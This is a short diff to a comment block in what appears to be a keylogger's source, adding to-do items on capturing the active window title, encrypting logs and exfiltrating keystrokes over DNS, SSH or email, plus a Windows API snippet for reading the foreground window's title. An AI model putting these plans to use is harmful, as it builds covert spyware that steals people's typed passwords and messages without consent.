@@ -11,6 +11,13 @@ Currently dead simple. Areas for improvement:
  - Get Window title of where text was typed. Gives context into keys logged
  - Exfiltrate data over DNS, SSH, email, something like that
  - Encrypt data before it is sent out/logged
+ - Don't open the file a billion times per second to read/write
+ - Use something like this:
+
+ char cWindow[MAX_PATH];
+ GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
+
+ to get the text of the window being typed in (in cWindow)
 
 */
 
